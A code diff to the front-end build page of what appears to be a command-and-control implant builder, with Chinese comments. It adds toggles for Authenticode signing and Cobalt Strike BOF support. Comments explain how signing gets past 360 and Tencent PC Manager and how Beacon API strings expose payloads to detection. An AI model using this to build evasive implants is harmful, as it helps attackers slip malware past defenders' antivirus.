@@ -29,7 +29,7 @@ export function Builds() {
   // 构建结果：一键上线命令由服务端生成（含下载地址解析 + 多条免杀变体），
   // 前端不再用 window.location.origin 自己拼地址（从 localhost 打开后台时会生成
   // 目标机无法访问的 localhost 地址）。
-  const [buildResult, setBuildResult] = useState<{ id: string; name: string; format: string; size: number; serverUrl: string; oneLinerSet?: OneLinerSet } | null>(null)
+  const [buildResult, setBuildResult] = useState<{ id: string; name: string; format: string; size: number; serverUrl: string; oneLinerSet?: OneLinerSet; signed?: boolean; signer?: string; signStatus?: string; signMessage?: string } | null>(null)
 
   // format -> 下载文件扩展名；未知格式原样返回，避免误转
   const formatToExt = (format: string): string => {
@@ -263,6 +263,10 @@ export function Builds() {
     upx_enabled: false,
     // 主动反沙箱进程检测：默认关闭（会被国产杀软主动防御拦截，见服务端说明）
     evasion_scan: false,
+    // BOF 支持：默认关闭（会带上整套 Cobalt Strike Beacon API 名字，是 full 档案里唯一剩下的高信号明文）
+    bof_enabled: false,
+    // 代码签名：证书在服务端配置，这里只决定本次构不签
+    sign_enabled: false,
     // 启动随机延迟：默认沿用服务端配置（implant.startup_delay_min/max）
     startup_delay_min: 0,
     startup_delay_max: 0,
@@ -385,6 +389,11 @@ export function Builds() {
         format: response.data.format,
         size: response.data.size,
         serverUrl: formData.server_url,
+        // 代码签名结果（未启用签名时服务端返回空值）
+        signed: response.data.signed,
+        signer: response.data.signer,
+        signStatus: response.data.sign_status,
+        signMessage: response.data.sign_message,
         // 一键上线命令与地址解析结果全部取自服务端响应
         oneLinerSet: response.data.one_liners?.length
           ? {
@@ -566,6 +575,16 @@ export function Builds() {
                 <div className="result-item"><span className="result-label">格式</span><span className="result-value">{buildResult.format}</span></div>
                 <div className="result-item"><span className="result-label">大小</span><span className="result-value">{(buildResult.size / 1024).toFixed(2)} KB</span></div>
                 <div className="result-item server-url"><span className="result-label">服务器地址</span><span className="result-value">{buildResult.serverUrl}</span></div>
+                {buildResult.signMessage !== undefined && (
+                  <div className="result-item">
+                    <span className="result-label">代码签名</span>
+                    <span className="result-value" style={{ color: buildResult.signed ? 'var(--color-success)' : 'var(--color-warning, #f0a020)' }}>
+                      {buildResult.signed
+                        ? `已签名（${buildResult.signer || '签名者未知'}）`
+                        : `未签名：${buildResult.signMessage || buildResult.signStatus || '未配置'}`}
+                    </span>
+                  </div>
+                )}
               </div>
               {buildResult.oneLinerSet?.variants?.length ? (
                 <div className="oneliner-section">
@@ -1081,6 +1100,52 @@ export function Builds() {
 
                 <div className="evasion-toggle-row">
                   <div className="toggle-group">
+                    <label className="toggle-label">
+                      <input
+                        type="checkbox"
+                        name="sign_enabled"
+                        checked={formData.sign_enabled || false}
+                        onChange={handleInputChange}
+                        disabled={!builderInfo?.evasion?.sign_configured}
+                      />
+                      <span>代码签名 (Authenticode)</span>
+                      {builderInfo?.evasion?.sign_configured ? (
+                        <span className="status-badge available">已配置</span>
+                      ) : (
+                        <span className="status-badge unavailable">未配置</span>
+                      )}
+                    </label>
+                    <p className="form-hint">
+                      {builderInfo?.evasion?.sign_message ||
+                        '在服务端配置 builder.sign_enabled + sign_pfx_path(密码) 或 sign_thumbprint 后可用'}
+                      <br />
+                      在装有 <strong>360/电脑管家</strong>的主机上，<strong>未签名的新 PE 会在创建进程阶段被拒绝执行并删除</strong>
+                      （实测连 Hello-World 程序也一样）；签名是"能不能跑起来"的敲门砖，但不是免杀银弹。
+                    </p>
+                  </div>
+                </div>
+
+                <div className="evasion-toggle-row">
+                  <div className="toggle-group">
+                    <label className="toggle-label">
+                      <input
+                        type="checkbox"
+                        name="bof_enabled"
+                        checked={formData.bof_enabled || false}
+                        onChange={handleInputChange}
+                      />
+                      <span>BOF 支持 (Cobalt Strike BOF)</span>
+                      <span className="status-badge unavailable">默认关闭</span>
+                    </label>
+                    <p className="form-hint">
+                      开启后载荷会带上整套 <code>Beacon*</code> API 名字（<code>BeaconDataParse</code>/<code>BeaconOutput</code>…，
+                      实测 22 处明文命中），这是 full 档案里唯一剩下的高信号特征 —— 只有确实要跑 BOF 时才勾。
+                    </p>
+                  </div>
+                </div>
+
+                <div className="evasion-toggle-row">
+                  <div className="toggle-group">
                     <label className="toggle-label"><span>启动随机延迟 (秒)</span></label>
                     <p className="form-hint">
                       载荷启动后随机休眠 [最小, 最大] 秒再首次回连，打乱"启动即行为"的
@@ -1195,6 +1260,13 @@ function OneLinerList({
             </div>
             <code className="oneliner-code">{v.command}</code>
             {v.desc && <p className="oneliner-hint">{v.desc}</p>}
+            {/* 加载器链的前置条件与风险提示（服务端 note 字段，普通变体为空） */}
+            {v.note && (
+              <p className="oneliner-hint" style={{ color: 'var(--color-warning, #f0a020)' }}>
+                <AlertTriangle size={12} style={{ verticalAlign: '-2px', marginRight: 4 }} />
+                {v.note}
+              </p>
+            )}
           </div>
         ))}
       </div>
